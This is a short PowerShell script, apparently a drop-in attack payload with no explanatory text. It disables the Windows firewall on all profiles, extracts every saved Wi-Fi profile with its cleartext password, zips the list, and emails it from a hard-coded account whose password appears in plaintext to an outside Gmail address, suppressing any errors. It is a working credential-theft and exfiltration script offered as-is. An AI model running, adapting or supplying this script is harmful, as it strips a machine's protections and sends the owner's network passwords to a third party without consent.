netsh advfirewall set allprofiles state off
$allProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
$allProfiles >> allProfiles.txt
Compress-Archive -Path 'allProfiles.txt' -DestinationPath 'allProfiles.zip'
try {
    $Sender = 'ioinfinitum@vivaldi.net'
    $Recipient = 'nine9brains@gmail.com'
    $pass = ConvertTo-SecureString 'pwdVivaldi22./' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass)
    Send-MailMessage -From $Sender -To $Recipient -Subject "Wifi Profiles" -Body "Attached you will find the zip file with profiles and passwords." -SmtpServer "smtp.vivaldi.net" -UseSSL -credential $creds -Attachments "allProfiles.zip"}
catch {
break }
